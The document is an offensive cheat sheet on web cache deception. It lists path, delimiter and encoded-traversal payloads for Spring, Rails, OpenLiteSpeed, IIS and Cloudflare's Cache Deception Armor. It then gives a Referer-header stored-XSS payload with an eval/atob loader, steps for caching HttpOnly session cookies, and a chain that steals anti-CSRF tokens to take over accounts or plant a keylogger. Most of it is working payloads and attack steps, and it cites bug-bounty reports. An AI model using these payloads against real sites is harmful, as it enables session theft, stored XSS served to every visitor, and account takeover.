# 02 — Web Cache Deception (WCD)

**Goal:** trick the cache into storing sensitive *dynamic* content under a *static* key, then retrieve it unauthenticated.
**Constraint:** a victim must visit your link; the browser must send the request → use only safe URL characters.

## Prerequisite
An origin delimiter/parse quirk the cache ignores (find it in ref 01). Then pick whichever discrepancy applies.

## 1. Static-extension exploitation
**Path-mapping discrepancy:** `/user/123/profile/wcd.css` → origin serves `/user/123/profile`; cache sees `.css` → stores.

**Delimiter discrepancy:**
| Framework | Payload |
|-----------|---------|
| Spring | `/profile;foo.css` |
| Rails | `/profile.ico` |
| OpenLiteSpeed | `/profile%00foo.js` |

**Encoded-delimiter:** `%23`→`#` truncate · `%3f`→`?` query-split · `%3b`→`;` matrix-split.
```
/profile%23wcd.css     → origin sees /profile (cut at #), cache sees .css
/myaccount%3fwcd.css   → origin sees /myaccount (cut at ?), cache sees .css
```
**Multi-proxy chain encoding:** `%253F` → proxy1 `%3F` → proxy2 `?`.

## 2. Static-directory exploitation
- **A — origin normalizes, cache doesn't:** `/static/..%2fprofile` → origin `/profile`, cache keys under `/static`.
- **B — cache normalizes, origin doesn't (needs delimiter):** `/profile;%2f%2e%2e%2fstatic` → origin `/profile`, cache resolves to `/static`.
- **C — direct encoded traversal:** `/aaa/..%2fprofile` (probe: if == `/profile`, origin normalizes).

## 3. Static-file exploitation
Exact names: `robots.txt`, `index.html`, `favicon.ico`.
```
/profile%2f%2e%2e%2findex.html?cb=12345   (?cb avoids the legit cached entry)
```
If cache normalizes traversal but origin doesn't, the dynamic response is cached as `/index.html`.

## 4. Microsoft IIS backslash
IIS converts `\`→`/`. If cache treats `%5C` as a normal char without knowing this:
```
/profile%5C..%5Cstatic
```

## 5. Cloudflare Cache Deception Armor bypass
Armor checks response `Content-Type` matches the request extension. Bypass with extensions **not** in its map:
```
/profile.avif
/profile.webp
/profile.woff2
```
(HackerOne #1391635.)

## 6. Semicolon-prefix technique
If an extension alone doesn't trigger caching, prefix a semicolon:
```
/xxxx/xxxxxx/;.js
/endpoint/;.css
/endpoint/;.woff2
```

## 7. Cookie caching (HttpOnly disclosure)
Some caches include **all** cookies (even `HttpOnly`) in a dynamic response cached under a static key.
```
Test: append .js/.css to an authenticated endpoint (e.g. /app/conversation/1.js),
then fetch unauthenticated. If session tokens appear → cache stores cookies → ATO.
```
TTL note: 404 caches ~10s (be quick); 200 caches ~24h (reliable). Use `;`-prefix if direct ext gives 404.

## 8. Referer reflection → stored XSS (no extension needed)
The `Referer` is often reflected unsanitized in analytics/error/OG tags. Real $6,300 payload:
```
GET /xxxx/xxxx/xxx HTTP/2
Host: redacted.com
Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=BASE64_JS_PAYLOAD>
```
Find URLs cached **without** any extension trick (homepage, search, default-cached API). Cross-subdomain cookies (`Domain=.target.com`) can spread the XSS. Steps: find reflected input → verify self-XSS → find no-extension cacheable URL → time the refresh window → poison at the right moment → confirm it fires for all visitors.

## WCD → ATO chain (see also ref 07)
Self-XSS in profile/name → WCD via `.woff2` caches the authed page incl. anti-CSRF token → fetch cached URL unauth → extract token → auto-submit CSRF form → email hijack or keylogger → account takeover ($16,500 series). Payload obfuscation e.g. `top[8680439..toString(30)](document.domain)` = `alert`.

## Automated WCD PoC (Lyst #631589 pattern)
Open a random `<10-char>.css` under the victim's session in a popup, wait ~3s for the CDN to cache, then read the cached URL unauth to extract username/email/member-id/session state. Root cause: dynamic `text/html` cached under `.css` with no `Content-Type` validation.
